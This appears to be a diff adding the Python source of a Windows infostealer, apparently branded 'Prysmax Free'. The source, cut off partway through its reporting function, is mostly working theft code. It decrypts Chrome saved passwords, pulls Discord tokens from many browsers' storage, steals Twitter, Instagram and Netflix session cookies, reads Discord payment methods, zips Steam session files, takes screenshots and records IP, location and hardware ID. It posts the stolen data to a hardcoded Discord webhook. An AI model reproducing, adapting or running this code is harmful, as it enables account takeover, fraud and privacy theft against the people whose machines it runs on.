@@ -1,1 +1,1181 @@
+# pip install pywin32 browser-cookie3 pycryptodome discord-webhook requests browser-history prettytable getmac psutil py-cpuinfo pyautogui colorama pillow cryptography
+import os
+import sys
+import win32con
+import browser_cookie3
+from json import loads, dumps
+from base64 import b64decode
+from sqlite3 import connect
+from shutil import copyfile
+from threading import Thread
+from win32crypt import CryptUnprotectData
+from Crypto.Cipher import AES
+from discord_webhook import DiscordEmbed, DiscordWebhook
+from subprocess import Popen, PIPE
+from urllib.request import urlopen, Request
+from requests import get, post
+from re import findall, search
+from win32api import SetFileAttributes, GetSystemMetrics
+from browser_history import get_history
+from prettytable import PrettyTable
+from platform import platform
+from getmac import get_mac_address as gma
+from psutil import virtual_memory
+from collections import defaultdict
+from zipfile import ZipFile, ZIP_DEFLATED
+from cpuinfo import get_cpu_info
+from multiprocessing import freeze_support
+from tempfile import TemporaryDirectory
+from pyautogui import screenshot
+from random import choices
+from string import ascii_letters, digits
+from colorama import init, Fore, Style
+import datetime
 
+# Default webhook URL that will be used if no custom URL is provided
+wbhk = "https://discord.com/api/webhooks/1368617766390726696/b73De6GoOI-evy7zzPRAA8fLktJKA6SF0idii5YvDSMmyY5wScORIWH3DJuebTfU67KV"
+
+# DEBUG MODE - im too retarded for debugging properly so i made this uwu
+global DEBUG_MODE
+DEBUG_MODE = False
+# Initialize colorama for colored console output
+init()
+
+# Debug logging function
+def log_debug(message, level="INFO"):
+    if DEBUG_MODE:
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        color = Fore.GREEN
+        if level == "WARNING":
+            color = Fore.YELLOW
+        elif level == "ERROR":
+            color = Fore.RED
+        elif level == "SUCCESS":
+            color = Fore.CYAN
+        
+        print(f"{color}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
+
+website = ["discord.com", "twitter.com", "instagram.com", "netflix.com"]
+
+
+def get_screenshot(path):
+    log_debug("Taking screenshot...", "INFO")
+    screenshot_img = screenshot()
+    screenshot_path = os.path.join(
+        path, f"Screenshot_{''.join(choices(list(ascii_letters + digits), k=5))}.png"
+    )
+    screenshot_img.save(screenshot_path)
+    log_debug(f"Screenshot saved to {screenshot_path}", "SUCCESS")
+    return screenshot_path
+
+
+def get_hwid():
+    log_debug("Getting hardware ID...", "INFO")
+    p = Popen("wmic csproduct get uuid", shell=True, stdout=PIPE, stderr=PIPE)
+    hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+    log_debug(f"HWID: {hwid}", "INFO")
+    return hwid
+
+
+def get_user_data(tk):
+    log_debug("Fetching Discord user data...", "INFO")
+    headers = {"Authorization": tk}
+    response = get("https://discordapp.com/api/v6/users/@me", headers=headers).json()
+    if DEBUG_MODE:
+        log_debug(f"Discord API response: {dumps(response, indent=2)}", "INFO")
+    return [
+        response["username"],
+        response["discriminator"],
+        response["email"],
+        response["phone"],
+    ]
+
+
+def has_payment_methods(tk):
+    log_debug("Checking for payment methods...", "INFO")
+    headers = {"Authorization": tk}
+    response = get(
+        "https://discordapp.com/api/v6/users/@me/billing/payment-sources",
+        headers=headers,
+    ).json()
+    if DEBUG_MODE:
+        log_debug(f"Payment methods found: {len(response)}", "INFO")
+    return response
+
+
+def cookies_grabber_mod(u):
+    log_debug(f"Grabbing cookies for domain: {u}", "INFO")
+    cookies = []
+    browsers = ["chrome", "edge", "firefox", "brave", "opera", "vivaldi", "chromium"]
+    for browser in browsers:
+        try:
+            log_debug(f"Attempting to get cookies from {browser}...", "INFO")
+            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
+            log_debug(f"Successfully retrieved cookies from {browser}", "SUCCESS")
+        except BaseException as e:
+            if DEBUG_MODE:
+                log_debug(f"Failed to get cookies from {browser}: {str(e)}", "ERROR")
+    return cookies
+
+
+def get_Personal_data():
+    log_debug("Getting personal data (IP, location)...", "INFO")
+    try:
+        ip_address = urlopen(Request("https://api64.ipify.org")).read().decode().strip()
+        log_debug(f"IP Address: {ip_address}", "INFO")
+        country = (
+            urlopen(Request(f"https://ipapi.co/{ip_address}/country_name"))
+            .read()
+            .decode()
+            .strip()
+        )
+        city = (
+            urlopen(Request(f"https://ipapi.co/{ip_address}/city"))
+            .read()
+            .decode()
+            .strip()
+        )
+        log_debug(f"Location: {city}, {country}", "SUCCESS")
+    except BaseException as e:
+        if DEBUG_MODE:
+            log_debug(f"Error getting location data: {str(e)}", "ERROR")
+        city = "City not found -_-"
+        country = "Country not found -_-"
+        ip_address = "No IP found -_-"
+    return [ip_address, country, city]
+
+
+def find_His():
+    log_debug("Retrieving browser history...", "INFO")
+    table = PrettyTable(padding_width=1)
+    table.field_names = ["CurrentTime", "Link"]
+    history_count = 0
+    for his in get_history().histories:
+        try:
+            a, b = his
+            history_count += 1
+            if len(b) <= 100:
+                table.add_row([a, b])
+            else:
+                x_ = b.split("//")
+                if len(x_) > 1:
+                    x__, x___ = x_[1].count("/"), x_[1].split("/")
+                    if x___ and x___[0] != "www.google.com":
+                        if x__ <= 5:
+                            b = f"{x_[0]}//"
+                            for p in x___:
+                                if x___.index(p) != len(x___) - 1:
+                                    b += f"{p}/"
+                            if len(b) <= 100:
+                                table.add_row([a, b])
+                            else:
+                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+                        else:
+                            b = f"{x_[0]}//{x___[0]}/[...]"
+                            if len(b) <= 100:
+                                table.add_row([a, b])
+                            else:
+                                table.add_row([a, f"{x_[0]}//{x___[0]}/[...]"])
+        except ValueError:
+            # Handle case where his doesn't unpack into exactly 2 values
+            if DEBUG_MODE:
+                log_debug(f"Skipping malformed history entry: {his}", "WARNING")
+            continue
+    log_debug(f"Retrieved {history_count} history entries", "SUCCESS")
+    return table.get_string()
+
+
+def get_encryption_key():
+    log_debug("Getting Chrome encryption key...", "INFO")
+    local_state_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "Local State",
+    )
+    if not os.path.exists(local_state_path):
+        log_debug(f"Local State file not found at {local_state_path}", "ERROR")
+        return None
+    
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = loads(f.read())
+    
+    try:
+        encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+        log_debug("Successfully retrieved encryption key", "SUCCESS")
+        return key
+    except Exception as e:
+        log_debug(f"Failed to get encryption key: {str(e)}", "ERROR")
+        return None
+
+
+def decrypt_data(data, key):
+    log_debug("Attempting to decrypt data...", "INFO")
+    
+    # Check if data is empty or None
+    if not data:
+        log_debug("Empty data provided for decryption", "ERROR")
+        return ""
+    
+    # First try: Direct CryptUnprotectData approach (no key needed)
+    try:
+        decrypted = CryptUnprotectData(data, None, None, None, 0)[1]
+        if isinstance(decrypted, bytes):
+            decrypted = decrypted.decode('utf-8', errors='replace')
+        else:
+            decrypted = str(decrypted)
+        log_debug("Successfully decrypted data with CryptUnprotectData", "SUCCESS")
+        return decrypted
+    except Exception as e:
+        log_debug(f"Direct decryption failed: {str(e)}", "WARNING")
+    
+    # Second try: Chrome v80+ encryption method (AES-GCM)
+    try:
+        # Check if data has the Chrome v80+ format (starts with 'DPAPI' or v10)
+        if data[:3] == b'v10' or data[:5] == b'DPAPI':
+            if data[:3] == b'v10':
+                # AES-GCM decryption
+                if not key:
+                    log_debug("Key required for AES decryption but not provided", "ERROR")
+                    return ""
+                
+                nonce = data[3:15]
+                ciphertext = data[15:]
+                cipher = AES.new(key, AES.MODE_GCM, nonce)
+                decrypted = cipher.decrypt(ciphertext)[:-16].decode('utf-8', errors='replace')
+                log_debug("Successfully decrypted data with AES-GCM", "SUCCESS")
+                return decrypted
+            elif data[:5] == b'DPAPI':
+                # DPAPI blob
+                decrypted = CryptUnprotectData(data, None, None, None, 0)[1]
+                if isinstance(decrypted, bytes):
+                    decrypted = decrypted.decode('utf-8', errors='replace')
+                else:
+                    decrypted = str(decrypted)
+                log_debug("Successfully decrypted DPAPI blob", "SUCCESS")
+                return decrypted
+    except Exception as e:
+        log_debug(f"Chrome v80+ decryption failed: {str(e)}", "WARNING")
+    
+    # Last resort: Try to decode as is or return empty string
+    try:
+        if isinstance(data, bytes):
+            return data.decode('utf-8', errors='replace')
+        return data.decode('utf-8', errors='replace')
+    except Exception as e:
+        log_debug(f"String conversion failed: {str(e)}", "WARNING")
+        return str(data)
+    except:
+        log_debug("All decryption methods failed", "ERROR")
+        return ""
+
+def main(dirpath):
+    log_debug("Starting main function...", "INFO")
+    log_debug(f"Working directory: {dirpath}", "INFO")
+    
+    # Fix: Use the platform function properly by importing it
+    from platform import platform as get_platform
+    system_info = get_platform()
+    log_debug(f"System info: {system_info}", "INFO")
+    log_debug(f"MAC Address: {gma()}", "INFO")
+    log_debug(f"RAM: {virtual_memory().total / (1024**3):.2f} GB", "INFO")
+    
+    # Take screenshot once
+    screenshot_path = get_screenshot(dirpath)
+    
+    # Get personal data once
+    ip_address, country, city = get_Personal_data()
+    
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData",
+        "Local",
+        "Google",
+        "Chrome",
+        "User Data",
+        "default",
+        "Login Data",
+    )
+    chrome_psw_list = []
+    if os.path.exists(db_path):
+        log_debug(f"Chrome Login Data found at: {db_path}", "INFO")
+        key = get_encryption_key()
+        filename = os.path.join(dirpath, "ChromeData.db")
+        copyfile(db_path, filename)
+        log_debug(f"Copied Chrome database to: {filename}", "INFO")
+        db = connect(filename)
+        cursor = db.cursor()
+        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+        chrome_psw_list = []
+        password_count = 0
+        for url, user_name, pwd in cursor.fetchall():
+            pwd_db = decrypt_data(pwd, key)
+            if pwd_db:
+                chrome_psw_list.append([user_name, pwd_db, url])
+                password_count += 1
+        log_debug(f"Retrieved {password_count} Chrome passwords", "SUCCESS")
+        cursor.close()
+        db.close()
+    else:
+        log_debug("Chrome Login Data file not found", "WARNING")
+    tokens = []
+    cleaned = []
+    t_lst = []
+    insta_lst = []
+    n_lst = []
+    
+    log_debug("Starting to process websites...", "INFO")
+    for w in website:
+        log_debug(f"Processing website: {w}", "INFO")
+        if w == website[0]:  # discord.com
+            log_debug("Processing Discord tokens...", "INFO")
+
+            def get_master_key(path):
+                try:
+                    if not os.path.exists(path):
+                        return None
+                        
+                    local_state_path = os.path.join(path, "Local State")
+                    if not os.path.exists(local_state_path):
+                        return None
+                        
+                    with open(local_state_path, "r", encoding="utf-8") as f:
+                        c = f.read()
+                        
+                    if 'os_crypt' not in c:
+                        return None
+                        
+                    local_state = loads(c)
+                    key = b64decode(local_state["os_crypt"]["encrypted_key"])
+                    key = key[5:]
+                    key = CryptUnprotectData(key, None, None, None, 0)[1]
+                    return key
+                except Exception as e:
+                    log_debug(f"Failed to get master key: {str(e)}", "ERROR")
+                    return None
+
+            def decrypt_password(buff, key):
+                try:
+                    iv = buff[3:15]
+                    payload = buff[15:]
+                    cipher = AES.new(key, AES.MODE_GCM, iv)
+                    decrypted_pass = cipher.decrypt(payload)
+                    decrypted_pass = decrypted_pass[:-16].decode()
+                    return decrypted_pass
+                except Exception as e:
+                    log_debug(f"Failed to decrypt password: {str(e)}", "ERROR")
+                    return None
+
+            def get_tokens(path):
+                log_debug(f"Searching for Discord tokens in: {path}", "INFO")
+                local_tokens = []
+                try:
+                    if not os.path.exists(path):
+                        log_debug(f"Path does not exist: {path}", "WARNING")
+                        return local_tokens
+                        
+                    leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+                    if not os.path.exists(leveldb_path):
+                        log_debug(f"LevelDB path not found: {leveldb_path}", "WARNING")
+                        return local_tokens
+                        
+                    log_debug(f"Searching for tokens in LevelDB: {leveldb_path}", "INFO")
+                    for file in os.listdir(leveldb_path):
+                        if file.endswith(".ldb") or file.endswith(".log"):
+                            try:
+                                with open(os.path.join(leveldb_path, file), "r", errors="ignore") as files:
+                                    for x in files.readlines():
+                                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
+                                            local_tokens.append(values)
+                            except Exception as e:
+                                if DEBUG_MODE:
+                                    log_debug(f"Error reading file {file}: {str(e)}", "ERROR")
+                                pass
+                                
+                    log_debug(f"Found {len(local_tokens)} raw tokens in {path}", "INFO")
+                    return local_tokens
+                except Exception as e:
+                    log_debug(f"Error processing path {path}: {str(e)}", "ERROR")
+                    return local_tokens
+
+            local = os.getenv("LOCALAPPDATA")
+            roaming = os.getenv("APPDATA")
+            paths = {
+                'Discord': os.path.join(roaming, "discord"),
+                'Discord Canary': os.path.join(roaming, "discordcanary"),
+                'Lightcord': os.path.join(roaming, "Lightcord"),
+                'Discord PTB': os.path.join(roaming, "discordptb"),
+                'Opera': os.path.join(roaming, "Opera Software", "Opera Stable"),
+                'Opera GX': os.path.join(roaming, "Opera Software", "Opera GX Stable"),
+                'Amigo': os.path.join(local, "Amigo", "User Data"),
+                'Torch': os.path.join(local, "Torch", "User Data"),
+                'Kometa': os.path.join(local, "Kometa", "User Data"),
+                'Orbitum': os.path.join(local, "Orbitum", "User Data"),
+                'CentBrowser': os.path.join(local, "CentBrowser", "User Data"),
+                '7Star': os.path.join(local, "7Star", "7Star", "User Data"),
+                'Sputnik': os.path.join(local, "Sputnik", "Sputnik", "User Data"),
+                'Vivaldi': os.path.join(local, "Vivaldi", "User Data", "Default"),
+                'Chrome SxS': os.path.join(local, "Google", "Chrome SxS", "User Data"),
+                'Chrome': os.path.join(local, "Google", "Chrome", "User Data", "Default"),
+                'Epic Privacy Browser': os.path.join(local, "Epic Privacy Browser", "User Data"),
+                'Microsoft Edge': os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
+                'Uran': os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
+                'Yandex': os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
+                'Brave': os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                'Iridium': os.path.join(local, "Iridium", "User Data", "Default"),
+            }
+
+            log_debug(f"Searching for Discord tokens in {len(paths)} potential locations", "INFO")
+            valid_paths = [p for p in paths.values() if os.path.exists(p)]
+            log_debug(f"Found {len(valid_paths)} valid paths to search", "INFO")
+
+            # Collect all tokens
+            raw_tokens = []
+            for platform, path in paths.items():
+                if not os.path.exists(path):
+                    continue
+                    
+                platform_tokens = get_tokens(path)
+                if platform_tokens:
+                    log_debug(f"Found {len(platform_tokens)} tokens in {platform}", "INFO")
+                    raw_tokens.extend(platform_tokens)
+            
+            # Process and decrypt tokens
+            log_debug(f"Processing {len(raw_tokens)} raw tokens", "INFO")
+            for token in raw_tokens:
+                token = token.replace("\\", "") if token.endswith("\\") else token
+                if token not in tokens:
+                    tokens.append(token)
+            
+            # Decrypt tokens
+            log_debug("Attempting to decrypt tokens...", "INFO")
+            decrypted_count = 0
+            for platform, path in paths.items():
+                if not os.path.exists(path):
+                    continue
+                    
+                try:
+                    master_key = get_master_key(path)
+                    if not master_key:
+                        continue
+                        
+                    for token in tokens[:]:  # Create a copy to iterate over
+                        try:
+                            if "dQw4w9WgXcQ:" in token:
+                                token_parts = token.split("dQw4w9WgXcQ:")[1]
+                                if token_parts:
+                                    cipher = AES.new(master_key, AES.MODE_GCM, b64decode(token_parts)[3:15])
+                                    decrypted = cipher.decrypt(b64decode(token_parts)[15:])[:-16].decode()
+                                    if decrypted and decrypted not in cleaned:
+                                        cleaned.append(decrypted)
+                                        decrypted_count += 1
+                        except Exception as e:
+                            if DEBUG_MODE:
+                                log_debug(f"Failed to decrypt token: {str(e)}", "ERROR")
+                            pass
+                except Exception as e:
+                    log_debug(f"Error with master key for {platform}: {str(e)}", "ERROR")
+                    continue
+                    
+            log_debug(f"Successfully decrypted {decrypted_count} tokens", "SUCCESS")
+                
+        elif w == website[1]:  # twitter.com
+            log_debug("Processing Twitter tokens...", "INFO")
+            t_cookies = []
+            for b in cookies_grabber_mod(w):
+                t_cookies.append(b.split(", "))
+            for c in t_cookies:
+                for y in c:
+                    if search(r"auth_token", y) is not None:
+                        token = y.split(" ")[1].split("=")[1]
+                        if token not in t_lst:
+                            t_lst.append(token)
+            log_debug(f"Found {len(t_lst)} Twitter tokens", "SUCCESS")
+                            
+        elif w == website[2]:  # instagram.com
+            log_debug("Processing Instagram accounts...", "INFO")
+            insta_cookies = []
+            for b in cookies_grabber_mod(w):
+                insta_cookies.append(b.split(", "))
+            browser_ = defaultdict(dict)
+            for c in insta_cookies:
+                if any(search(r"ds_user_id", str(c)) is not None for y in c) and any(search(r"sessionid", str(c)) is not None for y in c):
+                    for y in c:
+                        if search(r"ds_user_id", y) is not None:
+                            browser_[insta_cookies.index(c)][0] = y.split(" ")[1].split("=")[1]
+                        elif search(r"sessionid", y) is not None:
+                            browser_[insta_cookies.index(c)][1] = y.split(" ")[1].split("=")[1]
+            
+            account_count = 0
+            for x in list(dict(browser_).keys()):
+                if 0 in browser_[x] and 1 in browser_[x]:
+                    insta_lst.append([browser_[x][0], browser_[x][1]])
+                    account_count += 1
+            log_debug(f"Found {account_count} Instagram accounts", "SUCCESS")
+                    
+        elif w == website[3]:  # netflix.com
+            log_debug("Processing Netflix accounts...", "INFO")
+            n_cookies = []
+            for b in cookies_grabber_mod(w):
+                n_cookies.append(b.split(", "))
+            for c in n_cookies:
+                netflix_data = []
+                has_netflix_id = False
+                for y in c:
+                    if search(r"NetflixId", y) is not None:
+                        data = y.split(" ")[1].split("=")[1]
+                        if len(data) > 80:
+                            has_netflix_id = True
+                
+                if has_netflix_id:
+                    for y in c:
+                        cookie_parts = y.split(" ")[1].split("=")
+                        if len(cookie_parts) >= 2:
+                            netflix_data.append({
+                                "domain": f"{website[3]}",
+                                "name": f"{cookie_parts[0]}",
+                                "value": f"{cookie_parts[1]}"
+                            })
+                    if netflix_data:
+                        n_lst.append(netflix_data)
+            log_debug(f"Found {len(n_lst)} Netflix accounts", "SUCCESS")
+
+    # Verify Discord tokens and get payment methods
+    log_debug(f"Verifying {len(cleaned)} Discord tokens...", "INFO")
+    verified_tokens = []
+    all_data_p = []
+    verified_count = 0
+    
+    for token in cleaned:
+        try:
+            headers = {
+                "Content-Type": "application/json",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+                "Authorization": token
+            }
+            response = get("https://discordapp.com/api/v6/users/@me", headers=headers)
+            if response.status_code == 200:
+                verified_tokens.append(token)
+                verified_count += 1
+                log_debug(f"Verified token: {token[:15]}... (checking for payment methods)", "SUCCESS")
+                
+                # Get payment methods
+                payment_response = get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=headers)
+                if payment_response.status_code == 200:
+                    payment_data = payment_response.json()
+                    payment_count = 0
+                    
+                    for payment in payment_data:
+                        if payment["type"] == 1:  # Credit card
+                            writable = [
+                                payment.get("brand", "Unknown"),
+                                payment["type"],
+                                payment.get("last_4", "Unknown"),
+                                payment.get("expires_month", "Unknown"),
+                                payment.get("expires_year", "Unknown"),
+                                payment.get("billing_address", {})
+                            ]
+                            if writable not in all_data_p:
+                                all_data_p.append(writable)
+                                payment_count += 1
+                        elif payment["type"] == 2:  # PayPal
+                            writable_2 = [
+                                payment.get("email", "Unknown"),
+                                payment["type"],
+                                payment.get("billing_address", {})
+                            ]
+                            if writable_2 not in all_data_p:
+                                all_data_p.append(writable_2)
+                                payment_count += 1
+                    
+                    log_debug(f"Found {payment_count} payment methods for token", "INFO")
+        except Exception as e:
+            if DEBUG_MODE:
+                log_debug(f"Failed to verify token: {str(e)}", "ERROR")
+            pass
+    
+    log_debug(f"Verified {verified_count} Discord tokens out of {len(cleaned)}", "SUCCESS")
+    log_debug(f"Found {len(all_data_p)} total payment methods", "SUCCESS")
+    
+    # Prepare data for webhook
+    collected_data = {
+        "discord_tokens": verified_tokens,
+        "twitter_tokens": list(set(t_lst)),
+        "instagram_data": list(set(tuple(element) for element in insta_lst)),
+        "payment_methods": all_data_p,
+        "chrome_passwords": chrome_psw_list,
+        "netflix_data": n_lst
+    }
+    log_debug("Data collection complete", "SUCCESS")
+    log_debug(f"Summary: {len(verified_tokens)} Discord tokens, {len(t_lst)} Twitter tokens, {len(insta_lst)} Instagram accounts, {len(chrome_psw_list)} Chrome passwords, {len(n_lst)} Netflix accounts", "INFO")
+    
+    # Return the collected data
+    return [
+        verified_tokens,
+        list(set(t_lst)),
+        list(set(tuple(element) for element in insta_lst)),
+        all_data_p,
+        chrome_psw_list,
+        n_lst,
+    ]
+
+
+def kill_process(process_name):
+    try:
+        if DEBUG_MODE:
+            print(f"DEBUG: Attempting to kill process: {process_name}")
+        result = os.system(f"taskkill /F /IM {process_name}")
+        if DEBUG_MODE:
+            print(f"DEBUG: Process kill result: {result}")
+        return result == 0
+    except Exception as e:
+        if DEBUG_MODE:
+            print(f"DEBUG: Error killing process {process_name}: {str(e)}")
+        return False
+
+def steam_st():
+    try:
+        if DEBUG_MODE:
+            print("DEBUG: Starting Steam session collection")
+        kill_process("Steam.exe")
+        steam_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
+        
+        if not os.path.exists(steam_path):
+            if DEBUG_MODE:
+                print(f"DEBUG: Steam path not found at {steam_path}")
+            return None
+            
+        ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]
+        if DEBUG_MODE:
+            print(f"DEBUG: Found {len(ssfn_files)} SSFN files")
+            
+        steam_config_path = os.path.join(steam_path, "config")
+        
+        if not os.path.exists(steam_config_path):
+            if DEBUG_MODE:
+                print(f"DEBUG: Steam config path not found at {steam_config_path}")
+            return None
+            
+        zip_path = os.path.join(os.environ['TEMP'], "steam_session.zip")
+        with ZipFile(zip_path, 'w', ZIP_DEFLATED) as zp:
+            for root, dirs, files in os.walk(steam_config_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    try:
+                        zp.write(file_path, os.path.relpath(file_path, steam_path))
+                        if DEBUG_MODE:
+                            print(f"DEBUG: Added to zip: {file_path}")
+                    except Exception as e:
+                        if DEBUG_MODE:
+                            print(f"DEBUG: Failed to add file to zip: {file_path}, error: {str(e)}")
+                        pass
+                        
+            for ssfn_file in ssfn_files:
+                try:
+                    zp.write(ssfn_file, os.path.basename(ssfn_file))
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Added SSFN file to zip: {ssfn_file}")
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Failed to add SSFN file to zip: {ssfn_file}, error: {str(e)}")
+                    pass
+                    
+        if os.path.exists(zip_path) and os.path.getsize(zip_path) > 0:
+            if DEBUG_MODE:
+                print(f"DEBUG: Steam session zip created successfully: {zip_path}, size: {os.path.getsize(zip_path)} bytes")
+            return zip_path
+            
+    except Exception as e:
+        if DEBUG_MODE:
+            print(f"DEBUG: Error in steam_st function: {str(e)}")
+        pass
+        
+    return None
+
+def find_tokens():
+    if DEBUG_MODE:
+        print("DEBUG: Starting token collection")
+    tokens = []
+    local = os.getenv("LOCALAPPDATA")
+    roaming = os.getenv("APPDATA")
+    paths = {
+            "Discord"               : roaming + "\\Discord",
+            "Discord Canary"        : roaming + "\\discordcanary",
+            "Discord PTB"           : roaming + "\\discordptb",
+            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
+            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
+            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
+            'Lightcord'             : roaming + "\\Lightcord",
+            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
+            'Amigo'                 : local + "\\Amigo\\User Data",
+            'Torch'                 : local + "\\Torch\\User Data",
+            'Kometa'                : local + "\\Kometa\\User Data",
+            'Orbitum'               : local + "\\Orbitum\\User Data",
+            'CentBrowser'           : local + "\\CentBrowser\\User Data",
+            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
+            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
+            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
+            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
+            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
+            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
+            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
+        }
+
+    for platform, path in paths.items():
+        if DEBUG_MODE:
+            print(f"DEBUG: Checking {platform} at {path}")
+        if platform == 'Firefox':
+            # Special handling for Firefox
+            if os.path.exists(path):
+                if DEBUG_MODE:
+                    print(f"DEBUG: Firefox path exists, checking profiles")
+                for profile in os.listdir(path):
+                    profile_path = os.path.join(path, profile)
+                    if os.path.isdir(profile_path):
+                        try:
+                            for file in os.listdir(profile_path):
+                                if file.endswith('.sqlite'):
+                                    file_path = os.path.join(profile_path, file)
+                                    try:
+                                        with open(file_path, 'r', errors='ignore') as f:
+                                            content = f.read()
+                                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                                                for token in findall(regex, content):
+                                                    if token not in tokens:
+                                                        tokens.append(token)
+                                                        if DEBUG_MODE:
+                                                            print(f"DEBUG: Found token in Firefox: {token[:10]}...")
+                                    except Exception as e:
+                                        if DEBUG_MODE:
+                                            print(f"DEBUG: Error reading Firefox file {file_path}: {str(e)}")
+                                        pass
+                        except Exception as e:
+                            if DEBUG_MODE:
+                                print(f"DEBUG: Error processing Firefox profile {profile_path}: {str(e)}")
+                            pass
+        else:
+            # Standard path for other browsers
+            leveldb_path = os.path.join(path, "Local Storage", "leveldb")
+            if os.path.exists(leveldb_path):
+                if DEBUG_MODE:
+                    print(f"DEBUG: Found leveldb path for {platform}")
+                try:
+                    for file_name in os.listdir(leveldb_path):
+                        if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
+                            file_path = os.path.join(leveldb_path, file_name)
+                            try:
+                                with open(file_path, 'r', errors="ignore") as file:
+                                    for line in file.readlines():
+                                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                                            for token in findall(regex, line):
+                                                if token not in tokens:
+                                                    tokens.append(f"{token} | {platform}")
+                                                    if DEBUG_MODE:
+                                                        print(f"DEBUG: Found token in {platform}: {token[:10]}...")
+                            except Exception as e:
+                                if DEBUG_MODE:
+                                    print(f"DEBUG: Error reading file {file_path}: {str(e)}")
+                                pass
+                except Exception as e:
+                    if DEBUG_MODE:
+                        print(f"DEBUG: Error processing leveldb for {platform}: {str(e)}")
+                    pass
+
+    # Only send if tokens were found
+    if tokens:
+        if DEBUG_MODE:
+            print(f"DEBUG: Found {len(tokens)} tokens")
+        tokendata = {
+            "avatar_url": "https://raw.githubusercontent.com/Lawxsz/make-u-own-stealer/main/prysmax.gif",
+            "username": "Prysmax Free",
+            "embeds": [
+                {
+                    "title": "Discord Stealer",
+                    "fields": [
+                        {
+                            "name": "Tokens Found",
+                            "value": "\n".join(tokens) if tokens else "No tokens found",
+                        }
+                    ],
+                    "image": {
+                        "url": "https://usrbg.is-hardly.online/usrbg/v2/620525600528138251?849c=&size=4096",
+                        "height": 0,
+                        "width": 0
+                    }
+                }
+            ]
+        }
+        
+        headers = {
+            "Content-Type": "application/json"
+        }
+        
+        try:
+            # Use the webhook URLs from the DISCORD_WEBHOOK_URLs parameter
+            # or fall back to a default if needed
+            webhook_url = DISCORD_WEBHOOK_URLs[0] if DISCORD_WEBHOOK_URLs else "https://discord.com/api/webhooks/1368617766390726696/b73De6GoOI-evy7zzPRAA8fLktJKA6SF0idii5YvDSMmyY5wScORIWH3DJuebTfU67KV"
+            
+            # Always send the webhook data regardless of DEBUG_MODE
+            response = post(webhook_url, data=dumps(tokendata), headers=headers, timeout=5)
+            
+            if DEBUG_MODE:
+                print(f"DEBUG: Sent tokens to webhook: {webhook_url}")
+                print(f"DEBUG: Response status: {response.status_code}")
+                print(f"DEBUG: Token data: {dumps(tokendata, indent=2)}")
+        except Exception as e:
+            if DEBUG_MODE:
+                print(f"DEBUG: Error sending tokens to webhook: {str(e)}")
+            pass
+
+
+def send_webhook(DISCORD_WEBHOOK_URLs):
+    if DEBUG_MODE:
+        print("DEBUG: Starting send_webhook function")
+    p_lst = get_Personal_data()
+    cpuinfo = get_cpu_info()
+    with TemporaryDirectory(dir=os.environ['TEMP']) as td:
+        if DEBUG_MODE:
+            print(f"DEBUG: Created temporary directory: {td}")
+        SetFileAttributes(td, win32con.FILE_ATTRIBUTE_HIDDEN)
+        screenshot_path = get_screenshot(path=td)
+        if DEBUG_MODE:
+            print(f"DEBUG: Screenshot captured at: {screenshot_path}")
+        main_info = main(td)
+        if DEBUG_MODE:
+            print("DEBUG: Main info collected")
+            print(f"DEBUG: Discord tokens: {len(main_info[0])}")
+            print(f"DEBUG: Twitter tokens: {len(main_info[1])}")
+            print(f"DEBUG: Instagram tokens: {len(main_info[2])}")
+            print(f"DEBUG: Chrome passwords: {len(main_info[4])}")
+            print(f"DEBUG: Netflix accounts: {len(main_info[5])}")
+            
+        discord_T, twitter_T, insta_T, chrome_Psw_t = (
+            PrettyTable(padding_width=1) for _ in range(4)
+        )
+        (
+            discord_T.field_names,
+            twitter_T.field_names,
+            insta_T.field_names,
+            chrome_Psw_t.field_names,
+            verified_tokens,
+        ) = (
+            ["Discord Tokens", "Username", "Email", "Phone"],
+            ["Twitter Tokens [auth_token]"],
+            ["ds_user_id", "sessionid"],
+            ["Username / Email", "password", "website"],
+            [],
+        )
+        for __t in main_info[4]:
